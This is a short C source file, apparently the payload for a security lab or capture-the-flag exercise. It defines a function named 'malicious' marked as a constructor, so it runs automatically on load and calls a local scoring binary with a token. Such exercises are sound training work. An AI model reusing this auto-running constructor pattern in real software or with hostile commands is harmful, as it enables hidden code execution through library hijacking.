#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 05f95db5-9f49-48eb-80ce-439801df29a4");
}


